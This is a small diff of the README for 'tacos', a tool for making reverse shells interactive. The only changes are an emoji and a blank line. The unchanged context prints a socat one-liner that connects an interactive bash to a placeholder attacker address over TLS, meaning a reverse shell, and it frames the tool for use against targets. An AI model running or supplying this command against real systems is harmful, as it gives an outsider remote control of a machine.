@@ -1,4 +1,4 @@
-# tacos
+# tacos 🌮 
 <sup>(reverse `socat`)</sup>
 
 Spawn a pty in your reverse shell to automaticcaly make it interactive.
@@ -7,6 +7,7 @@ Equivalent of:
 ```shell
 socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP]:443,verify=0
 ```
+
 **Why ?**
 * too lazy to copy/paste/learn socat command
 * target doesn't have `socat` and you don't want to do [this](#alternative)
